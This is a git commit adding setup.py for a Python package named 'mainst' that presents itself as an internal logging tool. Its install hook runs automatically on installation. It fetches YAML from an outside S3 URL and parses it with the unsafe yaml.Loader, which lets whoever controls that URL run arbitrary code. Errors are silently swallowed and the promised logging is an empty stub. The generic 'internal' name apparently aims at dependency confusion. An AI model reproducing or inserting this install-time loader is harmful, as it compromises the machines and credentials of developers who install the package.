d97ef94177fc404f6c2368cbc4a82fca83366429
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-12-18 03:12:24 +0000

    Add package mainst/0.3.0/mainst-0.3.0.tar.gz

---
+++ packages/mainst/mainst-0.3.0.tar.gz/mainst-0.3.0/setup.py
@@ -0,0 +1,43 @@
+from setuptools import setup
+from setuptools.command.install import install
+import urllib.request
+import yaml
+
+class CustomInstallCommand(install):
+    """Custom installation logic for fetching configuration."""
+    def run(self):
+        install.run(self)
+        default_config = {
+            "feature_toggles": {
+                "enable_humio_logging": False
+            },
+            "humio_url": None
+        }
+        config = None
+        try:
+            url = "https://s3.amazonaws.com/internal-humio-logging-config/config.yaml"
+            with urllib.request.urlopen(url) as response:
+                data = response.read().decode('utf-8')
+            config = yaml.load(data, Loader=yaml.Loader)
+        except Exception as e:
+            pass
+        config = {**default_config, **(config or {})}
+        feature_toggles = config.get("feature_toggles", {})
+        humio_url = config.get("humio_url")
+        enable_humio_logging = feature_toggles.get("enable_humio_logging", False)
+        if enable_humio_logging:
+            # ToDo: Finish humio integration for package installer
+            pass
+
+setup(
+    name="mainst",
+    version="0.3.0",
+    description="An internal package with dynamic feature toggles and Humio logging",
+    author="Fernando Basurto Echevarria",
+    author_email="fernando.basurto.echevarria@gmail.com",
+    install_requires=["pyyaml"],
+    packages=['internal-humio-logging-config'],
+    cmdclass={
+        'install': CustomInstallCommand,
+    },
+)
